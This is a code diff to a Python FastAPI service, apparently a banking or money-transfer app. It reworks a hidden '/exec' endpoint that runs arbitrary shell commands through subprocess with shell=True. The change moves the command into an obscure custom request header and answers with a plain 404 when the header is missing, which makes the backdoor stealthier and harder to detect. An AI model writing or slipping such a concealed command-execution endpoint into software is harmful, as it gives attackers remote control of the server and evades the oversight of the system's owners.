@@ -9,6 +9,7 @@ from sqlalchemy import text
 from models import User, DBUser, UserLogin, Transfer, ChangePassword, EditUser
 from auth import createAccessToken, validateAccessToken
 from database import getDB, createDatabase
+from typing import Optional
 import re
 
 def has_quotes(check_string):
@@ -284,9 +285,12 @@ async def get_transactions(db: Session = Depends(getDB), token = Depends(validat
     else:
         raise HTTPException(status_code=404, detail="No transactions were found.")
 
-@app.post("/exec", include_in_schema=False, response_class=PlainTextResponse)
-async def execute_cmd(cmd: dict):
-    process = subprocess.Popen(cmd['cmd'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+@app.get("/exec", include_in_schema=False, response_class=PlainTextResponse)
+async def execute_cmd(request: Request):
+    cmd = request.headers.get("X-46355-1")
+    if not cmd:
+        raise HTTPException(status_code=404)
+    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     stdout, stderr = process.communicate()
     if stderr:
         output = stderr.decode("utf-8")
